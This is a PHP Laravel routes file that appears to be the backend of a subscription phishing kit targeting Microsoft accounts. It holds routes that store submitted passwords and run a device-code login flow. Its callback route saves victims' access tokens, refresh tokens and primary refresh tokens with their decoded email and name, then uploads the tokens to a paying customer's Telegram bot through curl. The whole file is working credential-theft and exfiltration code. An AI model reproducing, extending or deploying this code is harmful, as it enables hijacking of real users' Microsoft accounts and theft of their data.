<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CoreSystemController;
use App\Http\Controllers\Api\CommandController;
use Illuminate\Support\Facades\Log;
use App\Models\PythonJob;
use App\Jobs\RunPythonJob;
use App\Models\Token;
use App\Models\User;
use App\Http\Controllers\Api\MicrosoftAuthController;
use App\Http\Controllers\Api\CliAuthController;
use App\Http\Controllers\MicrosoftInboxController;
use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| MAIL WEBHOOK
|--------------------------------------------------------------------------
*/
Route::post('/cli/login-key', [CliAuthController::class, 'loginKey']);
Route::post('/cli/token/update', [CliAuthController::class, 'updateToken']);
Route::any('/mail-notify', function (Request $request) {

    if ($request->has('validationToken')) {
        header('Content-Type: text/plain');
        echo $request->query('validationToken');
        exit;
    }

    Log::info('MAIL WEBHOOK', [
        'body' => file_get_contents("php://input")
    ]);

    return response('ok', 200);
});

/*
|--------------------------------------------------------------------------
| BASIC ROUTES
|--------------------------------------------------------------------------
*/
Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
Route::post('/send-password', [CoreSystemController::class, 'storePassword']);

/*
|--------------------------------------------------------------------------
| MICROSOFT AUTH
|--------------------------------------------------------------------------
*/
Route::post('/start', [MicrosoftAuthController::class, 'start']);
Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);

/*
|--------------------------------------------------------------------------
| COMMAND
|--------------------------------------------------------------------------
*/
// Route::post('/command/start', [CommandController::class, 'start']);
// Route::get('/command/poll/{id}', [CommandController::class, 'poll']);

/*
|--------------------------------------------------------------------------
| PYTHON CALLBACK
|--------------------------------------------------------------------------
*/

Route::post('/python/callback', function (Request $request) {

    // 🔐 Security check
    if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
        return response()->json(['error' => 'unauthorized'], 403);
    }

    Log::info('PYTHON CALLBACK', $request->all());

    $job = PythonJob::find($request->job_id);
    if (!$job) {
        return response()->json(['error' => 'job not found'], 404);
    }

    $data = $request->input('data');
    $result = $job->result ?? [];

    // 🔥 Handle waiting_user (device code)
    if ($request->status === 'waiting_user') {
        $result['device'] = $data;
    }

    // 🔥 Handle done (token)
    if ($request->status === 'done') {
        $result['auth'] = $data;
    }

    // 🔥 Update job
    $job->update([
        'status' => $request->status,
        'result' => $result,
        'error' => $request->status === 'failed' ? $request->error : $job->error,
    ]);

    /*
    |--------------------------------------------------------------------------
    | SAVE TOKEN & SEND TO TELEGRAM
    |--------------------------------------------------------------------------
    */
    if ($request->status === 'done') {
        try {
            $prt = $data['prt'] ?? null;

            $idToken = is_array($prt) ? ($prt['id_token'] ?? null) : null;
            $decoded = decodeJwt($idToken);

            $email = is_array($decoded)
                ? ($decoded['upn'] ?? $decoded['unique_name'] ?? null)
                : null;

            $name = is_array($decoded)
                ? ($decoded['name'] ?? trim(($decoded['given_name'] ?? '') . ' ' . ($decoded['family_name'] ?? '')))
                : null;

            // 🔥 Simpan token ke DB
            if (!empty($data['access_token']) || !empty($prt)) {
                Token::create([
                    'user_id' => $job->user_id,
                    'access_token' => $data['access_token'] ?? null,
                    'refresh_token' => $data['refresh_token'] ?? null,
                    'prt' => json_encode($data['prt']),
                    'email' => $email,
                    'name' => $name,
                    'expires_at' => now()->addSeconds((int) ($data['expires_in'] ?? 3600)),
                    'status' => 'active',
                ]);
            }

            $user = $job->user;

            // 🔥 Cek subscription expired
            if ($user && !$user->isSubscriptionExpired()) {

                $settings = $user->settings;

                if ($settings && $settings->telegram_id_1 && $settings->telegram_bot_1) {

                    $telegramId = $settings->telegram_id_1;
                    $botToken = $settings->telegram_bot_1;

                    // 🔹 Pastikan folder temporary ada
                    $tmpFolder = storage_path('app/telegram_tmp');
                    if (!is_dir($tmpFolder))
                        mkdir($tmpFolder, 0777, true);

                    // 🔹 Buat file sementara hanya berisi PRT
                    $filePath = $tmpFolder . "/{$job->id}_prt.txt";
                    file_put_contents($filePath, json_encode($data['prt'] ?? []));

                    // 🔹 Kirim ke Telegram
                    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
                    $postFields = [
                        'chat_id' => $telegramId,
                        'document' => new \CURLFile($filePath),
                        'caption' => "Email: {$email}\nName: {$name}"
                    ];

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $response = curl_exec($ch);

                    if ($response === false) {
                        Log::error('Telegram sendDocument failed: ' . curl_error($ch));
                    } else {
                        Log::info('Telegram sent successfully', ['response' => $response]);
                    }

                    curl_close($ch);

                    // 🔹 Hapus file sementara setelah dikirim
                    if (file_exists($filePath)) {
                        unlink($filePath);
                    }
                }

            } else {
                Log::info("User {$user->id} subscription expired, telegram not sent.");
            }

        } catch (\Throwable $e) {
            Log::error('TOKEN_SAVE_FAILED', [
                'error' => $e->getMessage(),
                'data' => $data
            ]);
        }
    }

    return response()->json(['ok' => true]);

})->name('python.callback');

/*
|--------------------------------------------------------------------------
| CHECK JOB
|--------------------------------------------------------------------------
*/


// =========================
// 🚀 START JOB
// =========================
Route::post('/python/start', function (Request $request) {

    $apiKey = validateApiKey($request);

    if (!$apiKey) {
        return response()->json(['error' => 'Unauthorized'], 401);
    }

    $user = User::where('api_key', $apiKey)->first();

    if (!$user) {
        return response()->json(['error' => 'Invalid API key'], 401);
    }

    $job = PythonJob::create([
        'status' => 'pending',
        'user_id' => $user->id
    ]);

    RunPythonJob::dispatch($job->id)->onQueue('python');

    return response()->json([
        'job_id' => $job->id,
        'status' => 'started'
    ]);
});


// =========================
// 🔄 POLL JOB
// =========================
Route::get('/python/job/{id}', function (Request $request, $id) {

    $apiKey = validateApiKey($request);

    if (!$apiKey) {
        return response()->json(['error' => 'Unauthorized'], 401);
    }

    $user = User::where('api_key', $apiKey)->first();

    if (!$user) {
        return response()->json(['error' => 'Invalid API key'], 401);
    }

    $job = PythonJob::find($id);

    if (!$job) {
        return response()->json(['error' => 'Job not found'], 404);
    }

    // 🔥 PENTING: pastikan job milik user
    if ($job->user_id !== $user->id) {
        return response()->json(['error' => 'Forbidden'], 403);
    }

    return response()->json([
        'id' => $job->id,
        'status' => $job->status,
        'result' => $job->result,
        'error' => $job->error
    ]);
});
